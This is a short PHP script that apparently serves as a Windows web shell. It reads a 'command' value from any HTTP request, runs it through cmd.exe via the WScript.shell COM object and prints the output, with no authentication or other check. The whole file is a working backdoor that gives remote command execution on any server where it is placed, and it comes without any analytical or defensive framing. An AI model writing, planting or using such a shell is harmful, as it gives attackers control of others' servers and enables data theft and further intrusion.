<?php
$command = $_REQUEST['command'];

$wsh = new COM('WScript.shell');
$exec = $wsh->exec('cmd.exe /c '.$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
die("");
?>